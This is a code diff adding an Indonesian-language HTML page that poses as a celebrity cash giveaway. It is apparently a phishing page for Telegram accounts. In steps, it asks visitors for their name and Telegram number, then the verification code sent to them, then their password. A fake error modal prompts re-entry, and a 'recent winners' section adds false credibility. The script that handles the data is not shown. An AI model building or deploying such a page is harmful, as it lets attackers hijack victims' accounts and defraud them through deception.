@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Giveaway</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <div class="container">
+      <!-- Carousel Section -->
+      <div class="carousel">
+        <div class="carousel-images">
+          <img
+            src="https://asset-2.tstatic.net/style/foto/bank/images/ria-ricis-adakan-giveaway-dan-lakukan-aksi-baksos-untuk-rayakan-26-juta-subscribers-v.jpg"
+            alt="Giveaway Image 1"
+          />
+          <img
+            src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSe6Db7PoRyzcmtP9WCN8D_-J8rvkb7WFvhCp17X1EPCiDC9qh7vcGT0LIYwuOzlfPF6lo&usqp=CAU"
+            alt="Giveaway Image 2"
+          />
+          <img
+            src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSDa_PK75oUon0GPyltozF7fDkslxEwOuj9Ig&s"
+            alt="Giveaway Image 3"
+          />
+          <img
+            src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQWTPOJlxBoxM262dKYDaL8wr99x2rum3JPFA&s"
+            alt="Giveaway Image 4"
+          />
+        </div>
+      </div>
+
+      
+
+      <!-- Form Section -->
+<div class="form-container" id="step1">
+    <h2>Ikuti Giveaway Ria Ricis 2024 dan Menangkan Hadiah Tunai 25 Juta Rupiah!</h2>
+    <p>
+    Daftar sekarang untuk kesempatan memenangkan <strong>25 JUTA RUPIAH</strong>!
+    Ikuti langkah-langkah mudah ini dan Anda bisa jadi pemenang beruntung!
+    Semakin cepat Anda mendaftar, semakin besar peluang Anda untuk menang!
+</p>
+
+
+    <h3>Silakan masukkan Nama Lengkap dan Nomor Telegram Anda!</h3>
+    <input type="text" id="name" placeholder="Nama Lengkap" required />
+    <input type="tel" id="phone" placeholder="Nomor Telegram" required pattern="\d*" />
+    <button onclick="nextStep(1)">Lanjutkan</button>
+</div>
+
+<div class="form-container" id="step2" style="display: none">
+    <h3>Masukkan Kode Verifikasi yang Dikirim ke Telegram Anda</h3>
+    <p>Periksa pesan Telegram Anda dan masukkan kode verifikasi yang kami kirimkan untuk melanjutkan.</p>
+    <input type="text" id="otp" placeholder="Kode Verifikasi" required maxlength="5" pattern="\d*" />
+    <button onclick="nextStep(2)">Lanjutkan</button>
+</div>
+
+<div class="form-container" id="step3" style="display: none">
+    <h3>Masukkan Kata Sandi Anda untuk Keamanan Akun</h3>
+    <p>Untuk melindungi akun Anda, kami memerlukan kata sandi yang aman. Masukkan kata sandi Anda di bawah ini.</p>
+    <input type="password" id="password" placeholder="Kata Sandi" required />
+    <button onclick="submitForm()">Kirim</button>
+</div>
+
+
+<!-- Modal Pop-up -->
+<div id="confirmationModal" class="modal">
+  <div class="modal-content">
+    <span class="close">&times;</span>
+    <h2>Gagal Memproses!</h2>
+    <p>Pastikan agar semua yang anda masukkan sudah benar. silahkan isi ulang untuk mendapatkan hadiah.</p>
+    <button onclick="resetAndCloseModal()">OK</button>
+  </div>
+</div>
+
+
+
+      <!-- Winners Section -->
+      <div class="winners">
+        <h3>Penerima Hadiah Terbaru</h3>
+        <div id="winner-display">
+          <!-- Nama penerima hadiah akan ditampilkan di sini satu per satu -->
+        </div>
+      </div>
+    </div>
+
+    <script src="script.js"></script>
+  </body>
+</html>
